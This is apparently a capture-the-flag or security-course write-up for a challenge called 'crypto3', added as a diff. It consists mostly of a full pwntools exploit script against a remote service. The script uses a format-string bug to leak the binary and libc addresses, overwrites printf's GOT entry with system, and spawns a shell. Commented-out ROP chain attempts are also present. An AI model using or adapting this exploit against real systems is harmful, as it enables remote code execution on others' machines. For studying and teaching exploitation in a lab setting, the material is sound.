@@ -1,0 +1,131 @@
+crypto3
+===========================
+General overview of problems faced
+-------------------------------------
+* leak the base address of binary
+* use print() fmt_string vulns to leak the printf address
+* set print to system
+* set "/bin/sh" to system() argument
+
+  
+
+Script/Command used
+------------------
+```
+from pwn import *
+from format_exploit_generator import *
+
+host = "6447.lol"
+port = 9003
+p = remote(host, port)
+
+# p = process("./crypto3")
+
+# context.terminal = ['tmux', 'splitw', '-h']
+# gdb.attach(p)
+# pause()
+
+# gadget
+# 0x000000000000101a: ret;
+
+# #AAAABBBB %10$p
+# #%11$p...AAAABBBB
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"c")
+# p.sendlineafter(b"Chuck us some bytes (max 255): ", b"%11$p...AAAABBBB")
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+# p.recvuntil(b"[*] ETH\n")
+# print(p.recvuntil(b"\n",drop=True))
+
+libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')
+
+#cauculate base address of binary
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"c")
+p.sendlineafter(b"Chuck us some bytes (max 255): ", b"%9$p")
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+
+p.sendline()
+
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+p.recvuntil(b"[*] ETH\n[*] ")
+printed_address = p.recvuntil(b"\n",drop=True)
+ret_address_of_list = int(printed_address, 16)
+print("ret_address_of_list: ", hex(ret_address_of_list))
+
+ret_plt_address_of_list = 0x000015a2
+base_addr = ret_address_of_list - ret_plt_address_of_list 
+print("base_addr: ", hex(base_addr))
+
+
+p.sendline()
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"d")
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"c")
+
+# # buf_got = p64(0x004010 + base_addr)
+# puts_plt = p64(0x00001040 + base_addr)
+# #0x00000000000011c9: pop rdi; pop rbp; ret;
+# printf_got = p64(0x00004018 + base_addr)
+# pop_rdi_pop_rbp = p64(0x00000000000011c9 + base_addr)
+# payload = pop_rdi_pop_rbp + printf_got + b"AAAAAAAA" + puts_plt
+# p.sendlineafter(b"Chuck us some bytes (max 255): ", payload)
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+# p.recvuntil(b"[*] ETH\n[*] ")
+# leaked_address = p.recvuntil(b"\n",drop=True)
+# print("leaked_address: ", leaked_address)
+# printf_addr = u64(leaked_address.ljust(8,b'\x00'))
+# print("printf_addr: ",hex(printf_addr))
+
+#leak the address of printf and calculate libc.address.
+setbuf_got = 0x00004010 + base_addr
+setbuf_got_hex = hex(setbuf_got)
+printf_got = 0x00004018 + base_addr
+printf_got_hex = hex(printf_got)
+
+payload = "%11$s..".encode() + b"," + p64(setbuf_got)
+p.sendlineafter(b"Chuck us some bytes (max 255): ", payload)
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+p.recvuntil(b"[*] ETH\n[*] ")
+setbuf_address0 = u64(p.recvuntil(b"\n",drop=True)[:-9].ljust(8, b'\x00'))
+setbuf_address = hex(setbuf_address0)
+#printf_address = hex(u64(p.recvuntil(b"\n",drop=True)[:-9].ljust(8, b'\x00')))
+
+print("setbuf_address: ", setbuf_address)
+libc.address = setbuf_address0 - libc.symbols['setbuf']
+
+p.sendline()
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"d")
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"c")
+
+
+payload = fmt_address_write_payload(libc.symbols["system"], 10, 128, printf_got)
+
+p.sendlineafter(b"Chuck us some bytes (max 255): ", payload)
+p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+
+p.sendline()
+p.sendline(b'D')
+p.sendline(b'C')
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"d")
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"c")
+
+p.sendline(b'/bin/sh')
+p.sendline(b'L')
+
+# payload2 = p64(libc.address + 0x1cb42f) #/bin/sh
+# p.sendlineafter(b"Chuck us some bytes (max 255): ", payload)
+# p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"l")
+
+
+
+
+# #set shellcode gadgqet in create function
+# payload = 26 * p64(libc.address + 0x0000000000116ef6) #ret
+# payload += p64(libc.address + 0x000000000010f75b)  #pop rdi
+# payload += p64(libc.address + 0x1cb42f) #/bin/sh
+# payload += p64(libc.address + 0x0000000000116ef6) #ret
+# payload += p64(libc.symbols["system"])
+# p.sendlineafter(b"Chuck us some bytes (max 255): ", payload)
+
+
+p.interactive()
+p.close()
+```
